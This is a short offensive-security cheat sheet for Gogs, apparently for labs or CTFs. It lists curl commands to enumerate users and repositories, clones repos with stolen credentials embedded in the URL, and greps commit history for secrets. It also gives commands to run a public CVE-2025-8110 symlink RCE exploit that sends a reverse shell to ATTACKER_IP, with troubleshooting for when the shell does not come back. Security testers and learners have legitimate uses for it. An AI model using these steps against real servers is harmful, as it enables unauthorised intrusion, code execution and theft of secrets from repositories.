# Gogs

Gogs is a self-hosted Git service. After login, check public user enumeration, public repositories, private repositories available to the current user, and repository history for leaked source or config.

## Discovery

```bash
# Common web paths
curl -I http://TARGET/
curl http://TARGET/explore/users
curl http://TARGET/explore/repos
```

The footer or admin panel may disclose the version, Git version, Go version, build time, and build commit.

## Authenticated Repository Enumeration

```bash
# Clone a repository after getting credentials
git clone http://USER:PASSWORD@TARGET/OWNER/REPO.git

# If the password contains special URL characters, URL-encode it first.
python3 - << 'EOF'
from urllib.parse import quote
print(quote("PASSWORD", safe=""))
EOF

git clone http://USER:URL_ENCODED_PASSWORD@TARGET/OWNER/REPO.git
```

After cloning, always inspect history and staged data:

```bash
git log --oneline --all
git show COMMIT
git diff --cached
rg -i "pass|secret|token|key|db|config" .
```

## CVE-2025-8110 Symlink RCE

Authenticated Gogs instances may be vulnerable to a symlink-based RCE workflow where the exploit creates an application token, creates a repository, commits a malicious symlink, and triggers server-side processing.

```bash
git clone https://github.com/zAbuQasem/gogs-CVE-2025-8110
cd gogs-CVE-2025-8110

python3 CVE-2025-8110.py \
  -u http://TARGET \
  -lh ATTACKER_IP \
  -lp ATTACKER_PORT
```

### Troubleshooting

If cloning fails with `URL rejected: Bad hostname`, the password likely contains `@`, `!`, `#`, or other URL-significant characters. URL-encode the password inside the exploit before it builds clone URLs:

```python
from urllib.parse import quote

safe_password = quote(password, safe="")
clone_url = f"{scheme}://{username}:{safe_password}@{netloc}/{repo_path}"
```

If reverse shells do not return, test with a simple callback first:

```bash
sudo tcpdump -i tun0 icmp
# Change exploit command to:
ping -c4 ATTACKER_IP
```

